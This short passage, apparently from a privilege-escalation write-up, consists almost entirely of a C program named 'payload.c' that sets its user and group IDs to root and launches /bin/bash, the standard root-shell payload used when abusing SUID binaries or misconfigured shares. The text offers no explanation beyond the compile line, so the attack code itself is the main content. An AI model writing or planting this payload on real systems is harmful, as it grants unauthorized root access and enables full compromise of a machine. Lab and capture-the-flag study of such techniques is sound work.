I created a bash executable simple file in c language named as `payload.c` file ‚Üí

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>

int main(){
    setuid(0);
	setgid(0);
    system("/bin/bash");
    return 0;
}
```
